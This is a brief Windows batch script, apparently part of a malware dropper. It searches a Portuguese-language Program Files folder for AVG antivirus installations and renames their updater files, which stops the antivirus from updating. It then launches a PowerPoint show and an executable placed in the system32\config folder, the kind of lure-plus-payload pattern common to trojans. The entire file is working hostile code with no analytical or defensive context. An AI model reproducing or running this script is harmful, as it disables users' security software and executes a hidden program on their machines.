@echo off
cls
if exist c:\Arquiv~1 goto prij
goto exc
:prij
c:
cd\Arquiv~1
if exist AVG  goto ptoje
if exist AVG9 goto ptoje9
if exist AVG10 goto ptoje10
goto exc
:ptoje
cd AVG
if exist AVG9       goto ptoje9
if exist AVG10      goto ptoje10
if exist avgupd.exe goto ptojere 
goto exc
:ptoje9
cd AVG9
if exist avgupd.exe goto ptojere
goto exc
:ptojere
ren avgupd.exe avgxped.tcu
ren avgupd.dll avgaxed.tcu
goto exc
:ptoje10
cd AVG10
if exist avgupdx.dll goto ptojere2
goto exc
:ptojere2
ren avgupd.sig aveped.tcu
ren avgupdx.dll avexpad.tcu
ren updatecomps.bak avgteam.tcu
:exc
c:
cd\WINDOWS
cd system32
cd config
start Satifacos.pps
start Satisfe.exe
cd\
Exit
